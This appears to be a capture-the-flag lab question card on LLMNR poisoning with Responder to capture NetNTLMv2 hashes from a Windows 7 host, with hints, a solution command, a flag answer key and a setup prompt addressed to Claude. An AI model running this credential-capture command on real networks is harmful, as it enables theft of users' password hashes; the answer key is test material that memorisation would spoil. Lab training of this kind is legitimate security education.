# Q104 — Responder LLMNR Poisoning (Concept)

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `responder` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Describe Responder usage on Parrot to capture NetNTLMv2 hashes from Win7 LLMNR queries. Provide invocation.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=sudo responder -I eth0 -wrf`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`-I <iface>`; `-w` WPAD; `-r` rogue services; `-f` fingerprint.
</details>

<details>
<summary>Hint 2</summary>

Hashes saved under /usr/share/responder/logs/.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo responder -I eth0 -wrf
```

Captures hashes when Win7 attempts LLMNR resolution.

**Answer:** `cmd=sudo responder -I eth0 -wrf`

📖 Ref: [playbooks/sniffing-playbook.md](../../playbooks/sniffing-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q104:
1. Verify Win7 (192.168.52.130) up; attacker Parrot on same L2 segment.
2. On Parrot ensure responder installed: which responder (sudo apt install responder).
3. Interface is eth0 — verify: ip -br a.
4. On Win7 trigger an LLMNR query to capture (e.g. File Explorer → \\nonexistenthost).

Report back: "Lab ready for Q104 — responder installed, eth0 on 192.168.52.0/24, Win7 on segment".
```
